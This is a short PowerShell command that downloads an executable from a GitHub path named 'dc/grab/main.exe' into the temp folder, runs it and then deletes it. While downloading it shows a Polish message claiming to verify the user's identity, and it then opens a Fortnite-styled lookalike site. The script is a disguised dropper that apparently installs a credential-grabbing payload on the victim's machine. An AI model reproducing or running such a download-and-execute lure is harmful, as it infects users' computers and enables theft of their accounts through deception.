powershell -Command "& {
    $url = 'https://github.com/xKotelek/xKotelek/raw/main/dc/grab/main.exe';
    $output = Join-Path $env:TEMP 'temp.exe';
    $wc = New-Object System.Net.WebClient;

    $wc.DownloadProgressChanged += {
        $percentage = [int]($_.ProgressPercentage); # Cast to int to ensure no issues
        Write-Host ('Weryfikuję twoją tożsamość (status pobrania pliku) ' + $percentage + '%') -NoNewline;
    };

    $wc.DownloadFileAsync([Uri]$url, $output);
    while ($wc.IsBusy) {
        Start-Sleep -Milliseconds 500;
    }

    Start-Process $output;
    Remove-Item $output -Force;
    Start-Process 'https://f0rtn1te-xp.ct8.pl/';
    Write-Host 'Pobieranie zakończone. Naciśnij dowolny klawisz, aby zamknąć...' -ForegroundColor Green;
    Pause;
}"
